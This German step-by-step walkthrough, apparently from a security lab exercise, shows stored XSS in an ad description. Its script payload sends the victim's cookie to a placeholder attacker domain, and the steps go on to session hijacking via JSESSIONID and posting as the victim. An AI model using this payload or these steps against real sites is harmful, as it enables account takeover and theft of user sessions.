1. Sich als Angreifer anmelden
2. Payload in XSS anfällige Beschreibung einer Anzeige schreiben. (Die Beschreibung kann nur von angemeldeten Benutzer:innen eingesehen werden, deren Cookie man stehlen will.)
"https://cookielogger.local“ steht hier stellvertretend für die Domain vom attacker.

<script>document.write(`<img src='https://cookielogger.local?c=${document.cookie}'></img>`)</script>

4. Sich ausloggen und als Opfer in einem privaten Browsertab anmelden. Dann die präparierte Anzeige öffnen.
5. Den Cookie des Opfers in Datei ~/cookielogger/cookielog im Query String auslesen. Falls mehrere Cookies angezeigt werden, einen Cookie weiter unten nehmen. Der erste gehört dann wahrscheinlich zum Angreifer.

6. Cookie für eigene Anfragen nutzen. Dazu erst ausloggen. Dann im Browser Dev Tools > Web-Speicher zum manuellen Setzen von Cookie Werten. Dort JSESSIONID auf den abgefangen Wert setzen. 

7. Eine Anzeige im Namen des Opfers schalten. Als kleiner Beweis, dass man den Account geknackt hat.
